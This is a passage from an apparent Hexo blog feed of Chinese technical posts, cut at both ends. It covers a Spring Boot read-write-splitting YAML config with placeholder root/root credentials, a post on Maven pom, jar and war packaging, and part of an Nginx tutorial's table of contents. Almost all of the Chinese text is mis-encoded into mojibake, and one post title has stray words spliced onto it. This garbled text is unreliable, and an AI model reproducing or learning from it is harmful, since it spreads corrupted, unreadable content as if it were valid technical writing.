class="hljs-string">com.mysql.jdbc.Driver</span><br>        <span class="hljs-attr">url:</span> <span class="hljs-string">jdbc:mysql://ä½ çš„è™šæ‹ŸæœºIPåœ°å€:3308/reggie?characterEncoding=utf-8</span><br>        <span class="hljs-attr">username:</span> <span class="hljs-string">root</span><br>        <span class="hljs-attr">password:</span> <span class="hljs-string">root</span><br>    <span class="hljs-attr">masterslave:</span><br>      <span class="hljs-comment"># è¯»å†™åˆ†ç¦»é…ç½®</span><br>      <span class="hljs-attr">load-balance-algorithm-type:</span> <span class="hljs-string">round_robin</span> <span class="hljs-comment">#è½®è¯¢ï¼ˆå¦‚æœæœ‰å¤šä¸ªä»åº“ä¼šè½®è¯¢ç€è¯»ï¼‰</span><br>      <span class="hljs-comment"># æœ€ç»ˆçš„æ•°æ®æºåç§°</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">dataSource</span><br>      <span class="hljs-comment"># ä¸»åº“æ•°æ®æºåç§°</span><br>      <span class="hljs-attr">master-data-source-name:</span> <span class="hljs-string">master</span><br>      <span class="hljs-comment"># ä»åº“æ•°æ®æºåç§°åˆ—è¡¨ï¼Œå¤šä¸ªé€—å·åˆ†éš”</span><br>      <span class="hljs-attr">slave-data-source-names:</span> <span class="hljs-string">slave</span><br>    <span class="hljs-attr">props:</span><br>      <span class="hljs-attr">sql:</span><br>        <span class="hljs-attr">show:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#å¼€å¯SQLæ˜¾ç¤ºï¼Œé»˜è®¤false</span><br>  <span class="hljs-attr">main:</span><br>    <span class="hljs-attr">allow-bean-definition-overriding:</span> <span class="hljs-literal">true</span> <span class="hljs-comment">#å…è®¸beanæ•°æ®æºè¦†ç›–</span><br><br><br></code></pre></td></tr></table></figure><p>â€‹</p><p>è§£è¯»ä¸€ä¸‹ymlé…ç½®<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/7e5c203773a04fdd9b9a096659db9749.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><strong>å…è®¸Beanå®šä¹‰è¦†ç›–å¾ˆé‡è¦</strong></p><h3 id="æµ‹è¯•"><a class="markdownIt-Anchor" href="#æµ‹è¯•"></a> æµ‹è¯•</h3><p>å¯åŠ¨é¡¹ç›®ï¼Œå¯ä»¥çœ‹åˆ°ï¼Œè¯»å†™æ“ä½œåˆ†åˆ«åˆ°è¾¾äº†ä¸åŒçš„ä¸»æœºä¸Š<br />è¯»å†™åˆ†ç¦»æµ‹è¯•<br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/f647f0ab726e48f7a4ae0445970980d2.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /><br /><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/fd937b8b481946bba8325127319d22f9.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°" /></p>]]></content>
    
    
    <categories>
      
      <category>SpringBoot</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>MySQL</tag>
      
      <tag>Docker</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Mavenä¸‰ç§æ‰“åŒ… pom jar wardriver class</title>
    <link href="/2023/01/20/Maven%E4%B8%89%E7%A7%8D%E6%89%93%E5%8C%85%20pom%20jar%20war/"/>
    <url>/2023/01/20/Maven%E4%B8%89%E7%A7%8D%E6%89%93%E5%8C%85%20pom%20jar%20war/</url>
    
    <content type="html"><![CDATA[<h1 id="mavenä¸‰ç§æ‰“åŒ…-pom-jar-war"><a class="markdownIt-Anchor" href="#mavenä¸‰ç§æ‰“åŒ…-pom-jar-war"></a> Mavenä¸‰ç§æ‰“åŒ… pom jar war</h1><ol><li><p><code>&lt;packaging&gt;pom&lt;/packaging&gt;</code></p><p>åœ¨çˆ¶çº§é¡¹ç›®ä¸­çš„pom.xmlæ–‡ä»¶ä½¿ç”¨çš„packagingé…ç½®ä¸€å®šä¸ºpomã€‚çˆ¶çº§çš„pomæ–‡ä»¶åªä½œé¡¹ç›®çš„å­æ¨¡å—çš„æ•´åˆï¼Œåœ¨maveninstallæ—¶ä¸ä¼šç”Ÿæˆjar/warå‹ç¼©åŒ…ã€‚</p><p>å¯ä»¥é€šè¿‡æ ‡ç­¾æ¥æ•´åˆå­æ¨¡å—çš„ç¼–è¯‘é¡ºåºï¼ˆMavenå¼•å…¥ä¾èµ–ä½¿ç”¨æœ€çŸ­è·¯å¾„åŸåˆ™ï¼Œä¾‹å¦‚a&lt;â€“b&lt;â€“c1.0<br />ï¼Œd&lt;â€“e&lt;â€“f&lt;â€“c1.1ï¼Œç”±äºè·¯å¾„æœ€çŸ­ï¼Œæœ€ç»ˆå¼•å…¥çš„ä¸ºc1.0ï¼›ä½†è·¯å¾„é•¿åº¦ç›¸åŒæ—¶ï¼Œåˆ™ä¼šå¼•å…¥å…ˆç”³æ˜çš„ä¾èµ–ï¼‰ã€‚å› æ­¤å°½é‡å°†æ›´åŠ åº•å±‚çš„serviceæ”¾åœ¨æ›´å…ˆçš„ä½ç½®ä¼˜å…ˆåŠ è½½ä¾èµ–è¾ƒä¸ºåˆé€‚ã€‚<br />å¯ä»¥å°†ä¸€äº›å­é¡¹ç›®ä¸­å…±ç”¨çš„ä¾èµ–æˆ–å°†å…¶ç‰ˆæœ¬ç»Ÿä¸€å†™åˆ°çˆ¶çº§é…ç½®ä¸­ï¼Œä»¥ä¾¿ç»Ÿä¸€ç®¡ç†ã€‚<br />groupId, artifactId, versionèƒ½ç›´æ¥ä»çˆ¶çº§ç»§æ‰¿ï¼Œå‡å°‘å­é¡¹ç›®çš„pomé…ç½®ã€‚</p><p>pomçš„æ„æ€æ˜¯é¡¹ç›®é‡Œæ²¡æœ‰javaä»£ç ï¼Œä¹Ÿä¸æ‰§è¡Œä»»ä½•ä»£ç ï¼Œåªæ˜¯ä¸ºäº† <strong>èšåˆå·¥ç¨‹æˆ–ä¼ é€’ä¾èµ–ç”¨</strong> çš„ã€‚æ‰€ä»¥å¹¶ä¸ä¼šå¯»æ‰¾é…ç½®æ–‡ä»¶ï¼Œè‹¥æƒ³é…ç½®æ–‡ä»¶ç”Ÿæ•ˆï¼Œæ”¹ä¸ºjarã€‚</p></li><li><p><code>&lt;packaging&gt;jar&lt;/packaging&gt;</code></p></li></ol><p>JaråŒ…æ˜¯æœ€ä¸ºå¸¸è§çš„æ‰“åŒ…æ–¹å¼ï¼Œå½“pomæ–‡ä»¶ä¸­æ²¡æœ‰è®¾ç½®packagingå‚æ•°æ—¶ï¼Œé»˜è®¤ä½¿ç”¨jaræ–¹å¼æ‰“åŒ…ã€‚  è¿™ç§æ‰“åŒ…æ–¹å¼æ„å‘³ç€åœ¨mavenbuildæ—¶ä¼šå°†è¿™ä¸ªé¡¹ç›®ä¸­çš„æ‰€æœ‰javaæ–‡ä»¶éƒ½è¿›è¡Œç¼–è¯‘å½¢æˆ.classæ–‡ä»¶ï¼Œä¸”æŒ‰ç…§åŸæ¥çš„javaæ–‡ä»¶å±‚çº§ç»“æ„æ”¾ç½®ï¼Œæœ€ç»ˆå‹ç¼©ä¸ºä¸€ä¸ªjaræ–‡ä»¶ã€‚<br />å½“æˆ‘ä»¬ä½¿ç”¨mvn installå‘½ä»¤çš„æ—¶å€™ï¼Œèƒ½å¤Ÿå‘ç°åœ¨é¡¹ç›®ä¸­ä¸srcæ–‡ä»¶å¤¹åŒçº§æ–°ç”Ÿæˆäº†ä¸€ä¸ªtargetæ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹å†…çš„classesæ–‡ä»¶å¤¹å³ä¸ºåˆšæ‰æåˆ°çš„ç¼–è¯‘åå½¢æˆçš„æ–‡ä»¶å¤¹ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œè¿™æ˜¯æˆ‘è‡ªå·±çš„é¡¹ç›®ç”Ÿæˆçš„targetæ–‡ä»¶å¤¹ï¼Œè€Œæœ€ä¸‹æ–¹çš„jaræ–‡ä»¶å³ä¸ºæ­¤æ–‡ä»¶å¤¹çš„å‹ç¼©ç‰ˆæœ¬ã€‚</p><ol start="3"><li><code>&lt;packaging&gt;war&lt;/packaging&gt;</code><br />waråŒ…ä¸jaråŒ…éå¸¸ç›¸ä¼¼ï¼ŒåŒæ ·æ˜¯ç¼–è¯‘åçš„.classæ–‡ä»¶æŒ‰å±‚çº§ç»“æ„å½¢æˆæ–‡ä»¶æ ‘åæ‰“åŒ…å½¢æˆçš„å‹ç¼©åŒ…ã€‚ä¸åŒçš„æ˜¯ï¼Œå®ƒä¼šå°†é¡¹ç›®ä¸­ä¾èµ–çš„æ‰€æœ‰jaråŒ…éƒ½æ”¾åœ¨WEB-INF/libè¿™ä¸ªæ–‡ä»¶å¤¹ä¸‹<br />waråŒ…éå¸¸é€‚åˆéƒ¨ç½²æ—¶ä½¿ç”¨ï¼Œä¸å†éœ€è¦ä¸‹è½½å…¶ä»–çš„ä¾èµ–åŒ…ï¼Œèƒ½å¤Ÿä½¿ç”¨æˆ·æ‹¿åˆ°waråŒ…ç›´æ¥ä½¿ç”¨ï¼Œå› æ­¤å®ƒç»å¸¸ä½¿ç”¨äºå¾®æœåŠ¡é¡¹ç›®ç¾¤ä¸­çš„å…¥å£é¡¹ç›®çš„pomé…ç½®ä¸­</li></ol>]]></content>
    
    
    <categories>
      
      <category>Maven</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SpringBoot</tag>
      
      <tag>Maven</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Nginx</title>
    <link href="/2023/01/19/Nginx/"/>
    <url>/2023/01/19/Nginx/</url>
    
    <content type="html"><![CDATA[<p><ul class="markdownIt-TOC"><li><a href="#nginx%E7%AE%80%E4%BB%8B">Nginxç®€ä»‹</a><ul><li><a href="#%E8%83%8C%E6%99%AF%E4%BB%8B%E7%BB%8D">èƒŒæ™¯ä»‹ç»</a><ul><li><a href="#%E5%90%8D%E8%AF%8D%E8%A7%A3%E9%87%8A">åè¯è§£é‡Š</a></li></ul></li><li><a href="#%E5%B8%B8%E8%A7%81%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AF%B9%E6%AF%94">å¸¸è§æœåŠ¡å™¨å¯¹æ¯”</a><ul><li><a href="#iis">IIS</a></li><li><a href="#tomcat">Tomcat</a></li><li><a href="#apache">Apache</a></li><li><a href="#lighttpd">Lighttpd</a></li><li><a href="#%E5%85%B6%E4%BB%96%E7%9A%84%E6%9C%8D%E5%8A%A1%E5%99%A8">å…¶ä»–çš„æœåŠ¡å™¨</a></li><li><a href="#nginx%E7%9A%84%E4%BC%98%E7%82%B9">Nginxçš„ä¼˜ç‚¹</a><ul><li><a href="#1%E9%80%9F%E5%BA%A6%E6%9B%B4%E5%BF%AB-%E5%B9%B6%E5%8F%91%E6%9B%B4%E9%AB%98">(1)é€Ÿåº¦æ›´å¿«ã€å¹¶å‘æ›´é«˜</a></li><li><a href="#2%E9%85%8D%E7%BD%AE%E7%AE%80%E5%8D%95%E6%89%A9%E5%B1%95%E6%80%A7%E5%BC%BA">(2)é…ç½®ç®€å•ï¼Œæ‰©å±•æ€§å¼º</a></li><li><a href="#3%E9%AB%98%E5%8F%AF%E9%9D%A0%E6%80%A7">(3)é«˜å¯é æ€§</a></li><li><a href="#4%E7%83%AD%E9%83%A8%E7%BD%B2">(4)çƒ­éƒ¨ç½²</a></li><li><a href="#5%E6%88%90%E6%9C%AC%E4%BD%8E-bsd%E8%AE%B8%E5%8F%AF%E8%AF%81">(5)æˆæœ¬ä½ã€BSDè®¸å¯è¯</a></li></ul></li></ul></li><li><a href="#nginx%E7%9A%84%E5%8A%9F%E8%83%BD%E7%89%B9%E6%80%A7%E5%8F%8A%E5%B8%B8%E7%94%A8%E5%8A%9F%E8%83%BD">Nginxçš„åŠŸèƒ½ç‰¹æ€§åŠå¸¸ç”¨åŠŸèƒ½</a><ul><li><a href="#%E5%9F%BA%E6%9C%AChttp%E6%9C%8D%E5%8A%A1">åŸºæœ¬HTTPæœåŠ¡</a></li><li><a href="#%E9%AB%98%E7%BA%A7http%E6%9C%8D%E5%8A%A1">é«˜çº§HTTPæœåŠ¡</a></li><li><a href="#%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1">é‚®ä»¶æœåŠ¡</a></li><li><a href="#nginx%E5%B8%B8%E7%94%A8%E7%9A%84%E5%8A%9F%E8%83%BD%E6%A8%A1%E5%9D%97">Nginxå¸¸ç”¨çš„åŠŸèƒ½æ¨¡å—</a></li></ul></li></ul></li><li><a href="#nginx%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">Nginxç¯å¢ƒå‡†å¤‡</a><ul><li><a href="#nginx%E7%89%88%E6%9C%AC%E4%BB%8B%E7%BB%8D">Nginxç‰ˆæœ¬ä»‹ç»</a></li><li><a href="#%E8%8E%B7%E5%8F%96nginx%E6%BA%90%E7%A0%81">è·å–Nginxæºç </a></li><li><a href="#%E5%87%86%E5%A4%87%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%B3%BB%E7%BB%9F">å‡†å¤‡æœåŠ¡å™¨ç³»ç»Ÿ</a></li><li><a href="#nginx%E5%AE%89%E8%A3%85%E6%96%B9%E5%BC%8F%E4%BB%8B%E7%BB%8D">Nginxå®‰è£…æ–¹å¼ä»‹ç»</a><br />*<ul><li><a href="#gcc%E7%BC%96%E8%AF%91%E5%99%A8">GCCç¼–è¯‘å™¨</a></li><li><a href="#pcre">PCRE</a></li><li><a href="#zlib">zlib</a></li><li><a href="#openssl">OpenSSL</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%B8%80nginx%E7%9A%84%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85">æ–¹æ¡ˆä¸€ï¼šNginxçš„æºç ç®€å•å®‰è£…</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%BA%8Cyum%E5%AE%89%E8%A3%85">æ–¹æ¡ˆäºŒï¼šyumå®‰è£…</a></li><li><a href="#%E6%BA%90%E7%A0%81%E7%AE%80%E5%8D%95%E5%AE%89%E8%A3%85%E5%92%8Cyum%E5%AE%89%E8%A3%85%E7%9A%84%E5%B7%AE%E5%BC%82">æºç ç®€å•å®‰è£…å’Œyumå®‰è£…çš„å·®å¼‚ï¼š</a><ul><li><a href="#%E8%A7%A3%E5%8E%8Bnginx%E7%9B%AE%E5%BD%95">è§£å‹Nginxç›®å½•</a></li></ul></li><li><a href="#%E6%96%B9%E6%A1%88%E4%B8%89nginx%E7%9A%84%E6%BA%90%E7%A0%81%E5%A4%8D%E6%9D%82%E5%AE%89%E8%A3%85">æ–¹æ¡ˆä¸‰:Nginxçš„æºç å¤æ‚å®‰è£…</a></li><li><a href="#%E6%96%B9%E6%A1%88%E5%9B%9B%E5%AE%9D%E5%A1%94%E5%AE%89%E8%A3%85">æ–¹æ¡ˆå››:å®å¡”å®‰è£…</a></li></ul></li><li><a href="#nginx%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84%E5%88%86%E6%9E%90">Nginxç›®å½•ç»“æ„åˆ†æ</a><br />*</li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%90%AF%E5%81%9C%E5%91%BD%E4%BB%A4">NginxæœåŠ¡å™¨å¯åœå‘½ä»¤</a><ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80nginx%E6%9C%8D%E5%8A%A1%E7%9A%84%E4%BF%A1%E5%8F%B7%E6%8E%A7%E5%88%B6">æ–¹å¼ä¸€:NginxæœåŠ¡çš„ä¿¡å·æ§åˆ¶</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8Cnginx%E7%9A%84%E5%91%BD%E4%BB%A4%E8%A1%8C%E6%8E%A7%E5%88%B6">æ–¹å¼äºŒ:Nginxçš„å‘½ä»¤è¡Œæ§åˆ¶</a></li></ul></li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E5%92%8C%E6%96%B0%E5%A2%9E%E6%A8%A1%E5%9D%97">NginxæœåŠ¡å™¨ç‰ˆæœ¬å‡çº§å’Œæ–°å¢æ¨¡å—</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">ç¯å¢ƒå‡†å¤‡</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%B8%80%E4%BD%BF%E7%94%A8nginx%E6%9C%8D%E5%8A%A1%E4%BF%A1%E5%8F%B7%E8%BF%9B%E8%A1%8C%E5%8D%87%E7%BA%A7">æ–¹æ¡ˆä¸€:ä½¿ç”¨NginxæœåŠ¡ä¿¡å·è¿›è¡Œå‡çº§</a></li><li><a href="#%E6%96%B9%E6%A1%88%E4%BA%8C%E4%BD%BF%E7%94%A8nginx%E5%AE%89%E8%A3%85%E7%9B%AE%E5%BD%95%E7%9A%84make%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%88%90%E5%8D%87%E7%BA%A7">æ–¹æ¡ˆäºŒ:ä½¿ç”¨Nginxå®‰è£…ç›®å½•çš„makeå‘½ä»¤å®Œæˆå‡çº§</a></li></ul></li></ul></li><li><a href="#nginx%E6%A0%B8%E5%BF%83%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84">Nginxæ ¸å¿ƒé…ç½®æ–‡ä»¶ç»“æ„</a><ul><li><a href="#%E5%85%A8%E5%B1%80%E5%9D%97">å…¨å±€å—</a><ul><li><a href="#user%E6%8C%87%E4%BB%A4">useræŒ‡ä»¤</a></li><li><a href="#work-process%E6%8C%87%E4%BB%A4">work processæŒ‡ä»¤</a></li><li><a href="#%E5%85%B6%E4%BB%96%E6%8C%87%E4%BB%A4">å…¶ä»–æŒ‡ä»¤</a></li></ul></li><li><a href="#events%E5%9D%97">eventså—</a><ul><li><a href="#events%E6%8C%87%E4%BB%A4%E9%85%8D%E7%BD%AE%E5%AE%9E%E4%BE%8B">eventsæŒ‡ä»¤é…ç½®å®ä¾‹</a></li></ul></li><li><a href="#http%E5%9D%97">httpå—</a><ul><li><a href="#%E5%AE%9A%E4%B9%89mime-type">å®šä¹‰MIME-Type</a></li><li><a href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1%E6%97%A5%E5%BF%97">è‡ªå®šä¹‰æœåŠ¡æ—¥å¿—</a></li><li><a href="#%E5%85%B6%E4%BB%96%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4">å…¶ä»–é…ç½®æŒ‡ä»¤</a></li></ul></li><li><a href="#server%E5%9D%97%E5%92%8Clocation%E5%9D%97">serverå—å’Œlocationå—</a></li></ul></li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%9F%BA%E7%A1%80%E9%85%8D%E7%BD%AE%E5%AE%9E%E4%BE%8B">NginxæœåŠ¡å™¨åŸºç¡€é…ç½®å®ä¾‹</a></li><li><a href="#nginx%E6%9C%8D%E5%8A%A1%E6%93%8D%E4%BD%9C%E7%9A%84%E9%97%AE%E9%A2%98">NginxæœåŠ¡æ“ä½œçš„é—®é¢˜</a></li><li><a href="#nginx%E9%85%8D%E7%BD%AE%E6%88%90%E7%B3%BB%E7%BB%9F%E6%9C%8D%E5%8A%A1">Nginxé…ç½®æˆç³»ç»ŸæœåŠ¡</a></li><li><a href="#nginx%E5%91%BD%E4%BB%A4%E9%85%8D%E7%BD%AE%E5%88%B0%E7%B3%BB%E7%BB%9F%E7%8E%AF%E5%A2%83">Nginxå‘½ä»¤é…ç½®åˆ°ç³»ç»Ÿç¯å¢ƒ</a></li><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E9%83%A8%E7%BD%B2">Nginxé™æ€èµ„æºéƒ¨ç½²</a><ul><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E6%A6%82%E8%BF%B0">Nginxé™æ€èµ„æºæ¦‚è¿°</a></li><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4">Nginxé™æ€èµ„æºçš„é…ç½®æŒ‡ä»¤</a><ul><li><a href="#listen%E6%8C%87%E4%BB%A4">listenæŒ‡ä»¤</a></li><li><a href="#server_name%E6%8C%87%E4%BB%A4">server_nameæŒ‡ä»¤</a><ul><li><a href="#%E5%8C%B9%E9%85%8D%E6%89%A7%E8%A1%8C%E9%A1%BA%E5%BA%8F">åŒ¹é…æ‰§è¡Œé¡ºåº</a></li></ul></li><li><a href="#location%E6%8C%87%E4%BB%A4">locationæŒ‡ä»¤</a></li><li><a href="#%E8%AE%BE%E7%BD%AE%E8%AF%B7%E6%B1%82%E8%B5%84%E6%BA%90%E7%9A%84%E7%9B%AE%E5%BD%95root-alias">è®¾ç½®è¯·æ±‚èµ„æºçš„ç›®å½•root / alias</a></li><li><a href="#index%E6%8C%87%E4%BB%A4">indexæŒ‡ä»¤</a></li><li><a href="#error_page%E6%8C%87%E4%BB%A4">error_pageæŒ‡ä»¤</a></li></ul></li><li><a href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E4%BC%98%E5%8C%96%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95">é™æ€èµ„æºä¼˜åŒ–é…ç½®è¯­æ³•</a></li><li><a href="#nginx%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E5%8E%8B%E7%BC%A9%E5%AE%9E%E6%88%98">Nginxé™æ€èµ„æºå‹ç¼©å®æˆ˜</a><ul><li><a href="#gzip%E6%A8%A1%E5%9D%97%E9%85%8D%E7%BD%AE%E6%8C%87%E4%BB%A4">Gzipæ¨¡å—é…ç½®æŒ‡ä»¤</a></li><li><a href="#gzip%E5%8E%8B%E7%BC%A9%E5%8A%9F%E8%83%BD%E7%9A%84%E5%AE%9E%E4%BE%8B%E9%85%8D%E7%BD%AE">Gzipå‹ç¼©åŠŸèƒ½çš„å®ä¾‹é…ç½®</a></li><li><a href="#gzip%E5%92%8Csendfile%E5%85%B1%E5%AD%98%E9%97%AE%E9%A2%98">Gzipå’Œsendfileå…±å­˜é—®é¢˜</a><ul><li><a href="#gzip_static%E6%8C%87%E4%BB%A4">gzip_staticæŒ‡ä»¤</a></li><li><a href="#%E6%B7%BB%E5%8A%A0%E6%A8%A1%E5%9D%97%E5%88%B0nginx%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4">æ·»åŠ æ¨¡å—åˆ°Nginxçš„å®ç°æ­¥éª¤</a></li><li><a href="#gzip_static%E6%B5%8B%E8%AF%95%E4%BD%BF%E7%94%A8">gzip_staticæµ‹è¯•ä½¿ç”¨</a></li></ul></li></ul></li><li><a href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E7%9A%84%E7%BC%93%E5%AD%98%E5%A4%84%E7%90%86">é™æ€èµ„æºçš„ç¼“å­˜å¤„ç†</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%BC%93%E5%AD%98">ä»€ä¹ˆæ˜¯ç¼“å­˜</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AFweb%E7%BC%93%E5%AD%98">ä»€ä¹ˆæ˜¯webç¼“å­˜</a></li><li><a href="#web%E7%BC%93%E5%AD%98%E7%9A%84%E7%A7%8D%E7%B1%BB">webç¼“å­˜çš„ç§ç±»</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98">æµè§ˆå™¨ç¼“å­˜</a></li><li><a href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E8%A6%81%E7%94%A8%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98">ä¸ºä»€ä¹ˆè¦ç”¨æµè§ˆå™¨ç¼“å­˜</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B">æµè§ˆå™¨ç¼“å­˜çš„æ‰§è¡Œæµç¨‹</a></li><li><a href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%93%E5%AD%98%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">æµè§ˆå™¨ç¼“å­˜ç›¸å…³æŒ‡ä»¤</a><ul><li><a href="#expires%E6%8C%87%E4%BB%A4">expiresæŒ‡ä»¤</a></li><li><a href="#add_header%E6%8C%87%E4%BB%A4">add_headeræŒ‡ä»¤</a></li></ul></li></ul></li><li><a href="#nginx%E7%9A%84%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E8%A7%A3%E5%86%B3">Nginxçš„è·¨åŸŸé—®é¢˜è§£å†³</a><ul><li><a href="#%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">åŒæºç­–ç•¥</a></li><li><a href="#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98">è·¨åŸŸé—®é¢˜</a></li><li><a href="#%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E7%9A%84%E6%A1%88%E4%BE%8B%E6%BC%94%E7%A4%BA">è·¨åŸŸé—®é¢˜çš„æ¡ˆä¾‹æ¼”ç¤º</a></li><li><a href="#%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">è§£å†³æ–¹æ¡ˆ</a></li></ul></li><li><a href="#%E9%9D%99%E6%80%81%E8%B5%84%E6%BA%90%E9%98%B2%E7%9B%97%E9%93%BE">é™æ€èµ„æºé˜²ç›—é“¾</a><ul><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%B5%84%E6%BA%90%E7%9B%97%E9%93%BE">ä»€ä¹ˆæ˜¯èµ„æºç›—é“¾</a></li><li><a href="#nginx%E9%98%B2%E7%9B%97%E9%93%BE%E7%9A%84%E5%AE%9E%E7%8E%B0%E5%8E%9F%E7%90%86">Nginxé˜²ç›—é“¾çš„å®ç°åŸç†ï¼š</a></li><li><a href="#%E9%92%88%E5%AF%B9%E7%9B%AE%E5%BD%95%E8%BF%9B%E8%A1%8C%E9%98%B2%E7%9B%97%E9%93%BE">é’ˆå¯¹ç›®å½•è¿›è¡Œé˜²ç›—é“¾</a></li></ul></li></ul></li><li><a href="#rewrite%E5%8A%9F%E8%83%BD%E9%85%8D%E7%BD%AE">RewriteåŠŸèƒ½é…ç½®</a><ul><li><a href="#rewrite%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">Rewriteçš„ç›¸å…³æŒ‡ä»¤</a><ul><li><a href="#set%E6%8C%87%E4%BB%A4">setæŒ‡ä»¤</a></li><li><a href="#rewrite%E5%B8%B8%E7%94%A8%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F">Rewriteå¸¸ç”¨å…¨å±€å˜é‡</a></li><li><a href="#if%E6%8C%87%E4%BB%A4">ifæŒ‡ä»¤</a></li><li><a href="#break%E6%8C%87%E4%BB%A4">breakæŒ‡ä»¤</a></li><li><a href="#return%E6%8C%87%E4%BB%A4">returnæŒ‡ä»¤</a></li><li><a href="#rewrite%E6%8C%87%E4%BB%A4">rewriteæŒ‡ä»¤</a></li><li><a href="#rewrite_log%E6%8C%87%E4%BB%A4">rewrite_logæŒ‡ä»¤</a></li></ul></li><li><a href="#rewrite%E7%9A%84%E6%A1%88%E4%BE%8B">Rewriteçš„æ¡ˆä¾‹</a><ul><li><a href="#%E5%9F%9F%E5%90%8D%E8%B7%B3%E8%BD%AC">åŸŸåè·³è½¬</a></li><li><a href="#%E5%9F%9F%E5%90%8D%E9%95%9C%E5%83%8F">åŸŸåé•œåƒ</a></li><li><a href="#%E7%8B%AC%E7%AB%8B%E5%9F%9F%E5%90%8D">ç‹¬ç«‹åŸŸå</a></li><li><a href="#%E7%9B%AE%E5%BD%95%E8%87%AA%E5%8A%A8%E6%B7%BB%E5%8A%A0">ç›®å½•è‡ªåŠ¨æ·»åŠ &quot;/&quot;</a></li><li><a href="#%E5%90%88%E5%B9%B6%E7%9B%AE%E5%BD%95">åˆå¹¶ç›®å½•</a></li><li><a href="#%E9%98%B2%E7%9B%97%E9%93%BE">é˜²ç›—é“¾</a></li></ul></li></ul></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%A6%82%E8%BF%B0">Nginxåå‘ä»£ç†æ¦‚è¿°</a></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%9A%84%E9%85%8D%E7%BD%AE%E8%AF%AD%E6%B3%95">Nginxåå‘ä»£ç†çš„é…ç½®è¯­æ³•</a><ul><li><a href="#proxy_pass">proxy_pass</a></li><li><a href="#proxy_set_header">proxy_set_header</a></li><li><a href="#proxy_redirect">proxy_redirect</a></li></ul></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98">Nginxåå‘ä»£ç†å®æˆ˜</a><ul><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%B8%80">Nginxåå‘ä»£ç†å®æˆ˜ä¸€</a></li><li><a href="#nginx%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%AE%9E%E6%88%98%E4%BA%8C">Nginxåå‘ä»£ç†å®æˆ˜äºŒ</a></li></ul></li><li><a 